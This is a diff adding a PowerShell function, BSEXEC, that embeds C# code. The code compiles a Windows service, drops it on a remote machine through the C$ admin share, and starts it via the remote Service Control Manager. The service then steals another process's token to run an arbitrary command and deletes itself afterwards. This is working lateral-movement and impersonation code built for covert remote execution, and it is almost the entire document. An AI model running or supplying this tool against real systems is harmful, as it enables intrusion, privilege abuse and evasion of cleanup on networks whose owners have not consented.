@@ -1,0 +1,291 @@
+Function BSEXEC {
+
+
+Param (
+[Parameter(Mandatory=$True)]
+$Proc,
+[Parameter(Mandatory=$True)]
+$path,
+[Parameter(Mandatory=$True)]
+$Command,
+[Parameter(Mandatory=$True)]
+$Name
+
+)
+
+$source = @"
+using System;
+using System.ServiceProcess;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+//Makes WINAPI happy
+using DWORD = System.UInt32;
+//Service namespace
+namespace WindowsService
+{
+     //Def WINAPI calls
+     class loadDLL
+    {
+        
+        enum TOKEN_INFORMATION_CLASS {
+            
+            TokenSessionID
+
+        }
+
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess,
+                                              bool bInheritHandle,
+                                              uint dwProcessID);
+
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle,
+                                                   DWORD DesiredAccess,
+                                                  out IntPtr TokenHandle);
+                                                  
+        [DllImport("Advapi32.dll", CharSet = CharSet.Auto)]
+        public static extern bool CreateProcessAsUser(IntPtr hToken,
+                                                      string lpApplicationName,
+                                                      string lpCommandLine,
+                                                      IntPtr lpProcessAttributes,
+                                                      IntPtr lpThreadAttributes,
+                                                      bool bInheritHandles,
+                                                      Int32 dwCreationFlags,
+                                                      IntPtr lpEnvironment,
+                                                      string lpCurrentDirectory,
+                                                      ref Service.STARTUPINFO lpStartupInfo,
+                                                      out Service.PROCESS_INFORMATION lpProcessInformation);
+                                                      
+
+
+
+    }
+
+
+    public partial class Service : ServiceBase
+    {
+
+
+                 public enum SecurityImpersonationLevel
+{
+    SecurityAnonymous = 0,
+    SecurityIdentification = 1,
+    SecurityImpersonation = 2,
+    SecurityDelegation = 3
+}
+
+public enum TokenType
+{
+    TokenPrimary = 1,
+    TokenImpersonation = 2
+
+}
+        
+        //Def process info data structure for WINAPI    
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        //Def 
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        public const int TOKEN_ASSIGN_PRIMARY = (0x0001);
+        public const int TOKEN_DUPLICATE = (0x0002);
+        public const int TOKEN_IMPERSONATE = (0x0004);
+        public const int TOKEN_QUERY = (0x0008);
+     
+  
+
+        public Service()
+        {
+            this.ServiceName = "Test Service";
+            this.EventLog.Log = "Application";
+            this.CanHandlePowerEvent = false;
+            this.CanHandleSessionChangeEvent = false;
+            this.CanPauseAndContinue = false;
+            this.CanShutdown = false;
+            this.CanStop = true;
+        }
+        
+        static void Main()
+        {
+            ServiceBase.Run(new Service());
+        }
+        
+        protected override void OnStart(string[] args)
+        {
+
+              
+        
+    
+       
+            IntPtr ph;
+            uint access;
+            // code for ALL_ACCESS. Can't find a good resource for this, lifted this # from an unrelated VB script I found online
+            access = 0x0400;
+            IntPtr tHandle;
+            uint proc;
+            proc = $proc;
+            ph = loadDLL.OpenProcess(access, false, proc);
+            loadDLL.OpenProcessToken(ph, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, out tHandle);
+            System.String cmd = "$Command & sleep 1 & sc.exe stop $Name & sc.exe delete $Name";
+            STARTUPINFO info = new STARTUPINFO();
+            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+            info.cb = Marshal.SizeOf(info); 
+            info.dwFlags = 1;
+            info.wShowWindow = 0;
+                      
+
+
+            loadDLL.CreateProcessAsUser(
+                tHandle,
+                null,
+                cmd,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                0x00000010,
+                IntPtr.Zero,
+                null,
+                ref info,
+                out processInfo);
+
+        }
+
+        protected override void OnStop()
+        {
+            
+        }
+
+      
+         
+                
+
+    }
+   
+}
+
+"@
+
+Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.ServiceProcess -Language CSharp -OutputAssembly "\\$path\C$\Windows\$name.exe" -OutputType ConsoleApplication
+
+start-job -InitializationScript $init -scriptblock {
+
+add-type -TypeDefinition `
+@"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class CustomSCM
+{
+public void SCM()
+{
+        System.String path = "C:\\Windows\\$($args[1]).exe";
+
+        System.String name = "$($args[1])";
+
+        System.String machine = "$($args[0])";
+
+        IntPtr sHandle;
+
+        sHandle = loadDLL.OpenSCManager(
+        machine,
+        null,
+        0xF003F
+        );
+    
+        IntPtr service = loadDLL.CreateService(
+        sHandle,
+        name,
+        null,
+        0xF003F,
+        0x00000010,
+        0x00000003,
+        0x00000000,
+        path,
+        null,
+        0,
+        null,
+        null,
+        null
+        );
+
+    loadDLL.StartService(
+    service,
+    0,
+    null
+    );
+}
+public class loadDLL {
+
+[DllImport("Advapi32.dll", CharSet = CharSet.Auto)]
+public static extern IntPtr OpenSCManager(
+    string MachineName,
+    string DatabaseName,
+    uint DesiredAccess);
+
+[DllImport("Advapi32.dll", CharSet = CharSet.Auto)]
+public static extern IntPtr CreateService(
+    IntPtr SCManager,
+    string ServiceName,
+    string Displayname,
+    uint DesiredAccess,
+    uint ServiceType,
+    uint StartType,
+    uint ErrorControl,
+    string BinaryPathName,
+    string LoadOrderGroup,
+    uint TagId,
+    string Dependencies,
+    string ServiceStartName,
+    string Password
+    );
+
+[DllImport("Advapi32.dll", CharSet = CharSet.Auto)]
+public static extern IntPtr StartService(
+    IntPtr hService,
+    uint NumServiceArgs,
+    string ServiceArgVectrs
+    );
+
+}
+}
+"@
+
+
+
+$test = new-object CustomSCM
+
+$test.scm()
+
+
+
+} -argumentlist $path,$Name
+
+}
